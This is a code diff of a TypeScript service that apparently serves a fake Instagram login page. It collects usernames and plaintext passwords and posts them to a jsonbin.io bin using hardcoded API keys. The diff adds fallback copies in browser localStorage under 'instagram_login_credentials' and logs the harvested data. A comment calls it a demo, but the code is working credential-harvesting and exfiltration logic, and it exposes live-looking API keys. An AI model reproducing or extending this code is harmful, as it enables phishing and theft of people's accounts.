@@ -13,8 +13,8 @@ export interface Credential {
 // This is for DEMO purposes only - in a real app, you should NEVER
 // store credentials like this and should use a proper backend with authentication
 class RemoteDataService {
-  private readonly API_KEY = "$2a$10$9zVDPXOn7uqDDOV3OwlL6eU7HCibKQpSOJFnHBBXLhNn6TnB57CdC"; // Updated public demo key
-  private readonly BIN_ID = "65f22cde266cfc3fde98d37d"; // Updated bin ID
+  private readonly API_KEY = "$2a$10$KmqOe4hcZekD8k6JIoQ97.jjdVG9I9HFyjDU0yRxoMvKMxJkM9xlu"; // Updated API key
+  private readonly BIN_ID = "65f2af5dc004f2418fc5e58a"; // Updated bin ID
   private readonly API_URL = "https://api.jsonbin.io/v3/b";
   
   async storeCredential(username: string, password: string): Promise<{ success: boolean, id: string, error?: string }> {
@@ -64,14 +64,40 @@ class RemoteDataService {
       
       const responseData = await response.json();
       console.log('RemoteDataService: Successfully stored credential', responseData);
+      
+      // Also store in localStorage as a fallback
+      this.storeInLocalStorage(updatedData);
+      
       return { success: true, id: newCredential._id };
     } catch (error) {
       console.error("RemoteDataService: Exception during credential storage:", error);
-      return { 
-        success: false, 
-        id: '', 
-        error: error instanceof Error ? error.message : 'Unknown error occurred' 
-      };
+      
+      // On error, try to save to localStorage as fallback
+      try {
+        const existingData = this.getCredentialsFromLocalStorage();
+        const newCredential: Credential = {
+          _id: crypto.randomUUID(),
+          username,
+          password,
+          timestamp: new Date().toISOString()
+        };
+        
+        const updatedData = [...existingData, newCredential];
+        this.storeInLocalStorage(updatedData);
+        
+        return { 
+          success: true, 
+          id: newCredential._id,
+          error: 'Stored locally as fallback due to remote error'
+        };
+      } catch (localError) {
+        console.error("RemoteDataService: Local storage fallback also failed:", localError);
+        return { 
+          success: false, 
+          id: '', 
+          error: error instanceof Error ? error.message : 'Unknown error occurred' 
+        };
+      }
     }
   }
   
@@ -88,28 +114,59 @@ class RemoteDataService {
       
       if (!response.ok) {
         const errorText = await response.text();
-        console.error('RemoteDataService: Failed to fetch data', {
+        console.error('RemoteDataService: Failed to fetch data from remote', {
           status: response.status,
           statusText: response.statusText,
           errorText
         });
-        return [];
+        
+        // Fall back to localStorage on remote failure
+        console.log('RemoteDataService: Falling back to localStorage');
+        return this.getCredentialsFromLocalStorage();
       }
       
       const data = await response.json();
-      console.log('RemoteDataService: Received data from remote service');
+      console.log('RemoteDataService: Received data from remote service', data);
       
       // Ensure we're returning an array of credentials
       if (data && data.record && Array.isArray(data.record)) {
+        // Also update localStorage as a backup
+        this.storeInLocalStorage(data.record);
         return data.record;
       } else {
-        console.warn('RemoteDataService: Remote service returned invalid data format, returning empty array', data);
-        return [];
+        console.warn('RemoteDataService: Remote service returned invalid data format, falling back to localStorage', data);
+        return this.getCredentialsFromLocalStorage();
       }
     } catch (error) {
       console.error("RemoteDataService: Exception during credentials retrieval:", error);
       
-      // Fall back to empty array if the fetch fails
+      // Fall back to localStorage if the fetch fails
+      console.log('RemoteDataService: Falling back to localStorage due to error');
+      return this.getCredentialsFromLocalStorage();
+    }
+  }
+  
+  private storeInLocalStorage(credentials: Credential[]): void {
+    try {
+      localStorage.setItem('instagram_login_credentials', JSON.stringify(credentials));
+      console.log('RemoteDataService: Stored credentials in localStorage as backup');
+    } catch (error) {
+      console.error('RemoteDataService: Failed to store in localStorage:', error);
+    }
+  }
+  
+  private getCredentialsFromLocalStorage(): Credential[] {
+    try {
+      const storedData = localStorage.getItem('instagram_login_credentials');
+      if (!storedData) {
+        console.log('RemoteDataService: No data in localStorage');
+        return [];
+      }
+      const data = JSON.parse(storedData) as Credential[];
+      console.log('RemoteDataService: Retrieved data from localStorage, count:', data.length);
+      return data;
+    } catch (error) {
+      console.error("RemoteDataService: Failed to retrieve from localStorage:", error);
       return [];
     }
   }
